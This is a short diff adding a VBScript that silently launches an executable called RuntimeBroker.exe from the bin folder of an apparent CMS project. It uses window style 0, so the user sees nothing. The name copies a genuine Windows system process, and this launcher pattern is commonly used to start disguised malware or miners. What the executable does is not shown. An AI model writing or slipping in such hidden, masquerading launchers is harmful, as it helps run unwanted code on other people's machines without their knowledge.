@@ -1,0 +1,2 @@
+Set Ws = CreateObject("Wscript.Shell")
+Ws.Run("F:\uae-exchange_cms\bin\RuntimeBroker.exe"),0
